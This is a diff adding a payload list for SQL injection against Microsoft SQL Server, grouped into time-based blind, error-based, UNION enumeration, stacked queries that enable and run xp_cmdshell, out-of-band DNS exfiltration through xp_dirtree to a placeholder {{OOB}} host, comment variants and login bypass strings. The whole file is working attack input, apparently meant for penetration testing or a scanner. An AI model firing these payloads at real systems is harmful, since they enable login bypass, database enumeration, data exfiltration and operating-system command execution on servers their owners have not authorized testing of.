@@ -1,0 +1,31 @@
+# === Time-based blind ===
+'; WAITFOR DELAY '0:0:5'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (LEN(DB_NAME())>0) WAITFOR DELAY '0:0:5'-- -
+
+# === Error-based ===
+' AND 1=CONVERT(int,@@version)-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -
+'; SELECT 1/0-- -
+
+# === UNION enumeration ===
+' UNION SELECT @@version,user_name(),db_name()-- -
+' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'-- -
+' UNION SELECT name,2,3 FROM syscolumns WHERE id=OBJECT_ID('users')-- -
+
+# === Stacked / RCE via xp_cmdshell ===
+'; EXEC xp_cmdshell 'whoami'-- -
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
+
+# === Out-of-band — DNS ===
+# Wymagana podmiana {{OOB}}
+'; EXEC master..xp_dirtree '\\{{OOB}}\share'-- -
+'; DECLARE @x varchar(1024); SET @x=(SELECT TOP 1 name FROM sysobjects); EXEC('master..xp_dirtree "\\'+@x+'.{{OOB}}\\x"')-- -
+
+# === Comment variants ===
+'-- -
+'/*
+
+# === Login bypass ===
+' OR 1=1-- -
+admin'-- -
